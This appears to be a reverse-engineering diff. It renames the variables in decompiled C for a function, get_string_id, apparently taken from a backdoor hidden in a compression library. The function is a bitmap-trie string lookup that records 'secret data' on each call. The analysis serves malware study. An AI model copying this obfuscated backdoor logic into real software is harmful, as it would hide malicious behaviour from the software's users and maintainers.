@@ -16,72 +16,72 @@
 EncodedStringId get_string_id(char *string_begin,char *string_end)
 
 {
-  ushort *puVar1;
-  long lVar2;
-  ushort uVar3;
-  ushort uVar4;
-  BOOL BVar5;
-  uint uVar6;
-  byte bVar7;
-  ushort uVar8;
-  ulong *puVar9;
-  byte *pbVar10;
-  long lVar11;
-  ulong uVar12;
+  ushort *node_entry;
+  long bit_index;
+  ushort child_flags;
+  ushort child_offset;
+  BOOL logged;
+  uint bitmap_rank;
+  byte ch;
+  ushort node_flags;
+  ulong *bitmap_row;
+  byte *scan_limit;
+  long trie_cursor;
+  ulong bitmap_word;
   
-  BVar5 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0xa,8,1);
-  if (BVar5 != FALSE) {
-    pbVar10 = (byte *)(string_begin + 0x2c);
-    if ((string_end != (char *)0x0) && (string_end < pbVar10)) {
-      pbVar10 = (byte *)string_end;
+  logged = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0xa,8,1);
+  if (logged != FALSE) {
+    scan_limit = (byte *)(string_begin + 0x2c);
+    if ((string_end != (char *)0x0) && (string_end < scan_limit)) {
+      scan_limit = (byte *)string_end;
     }
-    lVar11 = 0x10c2a8;
-    puVar9 = (ulong *)(_Lcrc64_clmul_1 + 0x760);
-    for (; (string_begin <= pbVar10 && (bVar7 = *string_begin, -1 < (char)bVar7));
+    trie_cursor = 0x10c2a8;
+    bitmap_row = (ulong *)(_Lcrc64_clmul_1 + 0x760);
+    for (; (string_begin <= scan_limit && (ch = *string_begin, -1 < (char)ch));
         string_begin = (char *)((byte *)string_begin + 1)) {
-      if (bVar7 < 0x40) {
-        uVar12 = *puVar9;
-        uVar6 = 0;
-        if ((uVar12 >> (bVar7 & 0x3f) & 1) == 0) {
+      if (ch < 0x40) {
+        bitmap_word = *bitmap_row;
+        bitmap_rank = 0;
+        if ((bitmap_word >> (ch & 0x3f) & 1) == 0) {
           return 0;
         }
       }
       else {
-        uVar12 = puVar9[1];
-        bVar7 = bVar7 - 0x40;
-        if ((uVar12 >> (bVar7 & 0x3f) & 1) == 0) {
+        bitmap_word = bitmap_row[1];
+        ch = ch - 0x40;
+        if ((bitmap_word >> (ch & 0x3f) & 1) == 0) {
           return 0;
         }
-        uVar6 = count_bits(*puVar9);
+        bitmap_rank = count_bits(*bitmap_row);
       }
       while( TRUE ) {
-        lVar2 = 0;
-        if (uVar12 != 0) {
-          for (; (uVar12 >> lVar2 & 1) == 0; lVar2 = lVar2 + 1) {
+        bit_index = 0;
+        if (bitmap_word != 0) {
+          for (; (bitmap_word >> bit_index & 1) == 0; bit_index = bit_index + 1) {
           }
         }
-        if ((uint)lVar2 == (uint)bVar7) break;
-        uVar6 = uVar6 + 1;
-        uVar12 = uVar12 & uVar12 - 1;
+        if ((uint)bit_index == (uint)ch) break;
+        bitmap_rank = bitmap_rank + 1;
+        bitmap_word = bitmap_word & bitmap_word - 1;
       }
-      puVar1 = (ushort *)(lVar11 + (ulong)uVar6 * 4);
-      uVar8 = *puVar1;
-      uVar4 = puVar1[1];
-      if ((uVar8 & 4) != 0) {
-        return (int)(short)uVar4;
+      node_entry = (ushort *)(trie_cursor + (ulong)bitmap_rank * 4);
+      node_flags = *node_entry;
+      child_offset = node_entry[1];
+      if ((node_flags & 4) != 0) {
+        return (int)(short)child_offset;
       }
-      if ((uVar8 & 2) == 0) {
-        uVar4 = -uVar4;
+      if ((node_flags & 2) == 0) {
+        child_offset = -child_offset;
       }
       else {
-        uVar8 = uVar8 & 0xfffd;
+        node_flags = node_flags & 0xfffd;
       }
-      uVar3 = uVar8 & 0xfffe;
-      if ((uVar8 & 1) == 0) {
-        uVar3 = -uVar8;
+      child_flags = node_flags & 0xfffe;
+      if ((node_flags & 1) == 0) {
+        child_flags = -node_flags;
       }
-      lVar11 = lVar11 + (short)(uVar4 - 4);
-      puVar9 = (ulong *)((long)puVar9 + (long)(short)(uVar3 - 0x10));
+      trie_cursor = trie_cursor + (short)(child_offset - 4);
+      bitmap_row = (ulong *)((long)bitmap_row + (long)(short)(child_flags - 0x10));
     }
   }
   return 0;
